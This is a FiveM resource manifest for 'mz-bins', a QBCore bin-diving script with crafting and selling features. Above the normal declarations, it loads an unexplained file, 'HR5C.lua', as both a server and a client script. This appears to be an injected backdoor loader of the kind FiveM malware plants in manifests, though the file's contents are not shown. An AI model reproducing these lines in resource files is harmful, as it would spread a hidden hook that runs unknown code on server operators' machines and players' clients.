server_script "HR5C.lua"

client_script "HR5C.lua"

fx_version 'cerulean'

game 'gta5'

author 'Mr_Zain#4139'

description 'mz-bins - a bin diving resource with crafting + sale components (with or without mz-skill integration)'

version '1.4.0'

shared_scripts {
	'@qb-core/shared/locale.lua',
	'config.lua',
	'locales/en.lua',
}

client_script 'client/main.lua'

server_script 'server/main.lua'

lua54 'yes'

